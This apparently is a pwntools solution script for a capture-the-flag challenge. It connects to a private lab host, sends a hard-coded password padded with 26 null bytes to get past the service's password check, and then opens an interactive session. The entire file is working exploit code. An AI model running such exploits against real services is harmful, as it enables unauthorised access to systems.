#!/usr/bin/env python3

import pwn

def main():
    conn=pwn.remote("172.25.106.194",4000)
    payload =b"SuPerpAsSworD"+b"\x00"*26
    conn.sendlineafter("Please enter your password:",payload)    
    conn.interactive()
    conn.close()
    

if __name__ == '__main__':
    main()